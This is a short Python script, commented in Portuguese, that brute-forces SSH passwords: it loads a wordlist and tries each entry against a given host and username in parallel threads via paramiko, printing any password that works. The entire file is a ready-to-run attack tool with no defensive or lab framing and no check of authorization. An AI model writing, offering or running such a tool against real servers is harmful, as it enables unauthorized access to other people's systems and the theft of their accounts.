# Sistema de Brute Force Simples e Eficiente para SSH
# Utiliza threading para eficiência e paramiko para conexões SSH

import paramiko
import concurrent.futures
import sys

def try_ssh_login(ip, username, password, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        client.close()
        return password  # Senha encontrada
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        return None

def brute_force_ssh(ip, username, wordlist_path, port=22, max_workers=10):
    with open(wordlist_path, 'r') as file:
        passwords = [line.strip() for line in file if line.strip()]

    found_password = None
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(try_ssh_login, ip, username, password, port): password for password in passwords}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found_password = result
                executor.shutdown(wait=False)  # Para os outros threads
                break

    return found_password

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python brute_force.py <IP> <username> <wordlist.txt>")
        sys.exit(1)

    ip = sys.argv[1]
    username = sys.argv[2]
    wordlist_path = sys.argv[3]

    print(f"Iniciando brute force em {ip} para usuário {username}...")
    password = brute_force_ssh(ip, username, wordlist_path)

    if password:
        print(f"Senha encontrada: {password}")
    else:
        print("Nenhuma senha encontrada na wordlist.")